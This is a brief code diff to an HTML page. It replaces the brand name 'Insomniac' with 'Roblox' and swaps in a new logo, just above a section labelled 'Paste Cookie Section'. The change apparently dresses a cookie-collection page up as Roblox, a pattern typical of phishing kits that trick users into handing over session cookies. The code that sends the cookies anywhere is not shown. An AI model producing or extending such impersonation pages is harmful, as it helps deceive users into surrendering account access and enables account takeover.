@@ -127,9 +127,9 @@
           <!-- Branding -->
           <div style="display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:22px;color:#ffffff;">
             <svg width="28" height="28" viewBox="0 0 24 24" fill="currentColor">
-              <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+              <path d="M18.92 2.01L5.08 6.84 2.01 20.69 15.85 15.86 18.92 2.01zM13.44 13.44l-4.14 1.45-1.45-4.14 4.14-1.45 1.45 4.14z"/>
             </svg>
-            <span style="font-size:24px;font-weight:800;letter-spacing:0.3px;">Insomniac</span>
+            <span style="font-size:24px;font-weight:800;letter-spacing:0.3px;">Roblox</span>
           </div>
 
           <!-- Paste Cookie Section -->
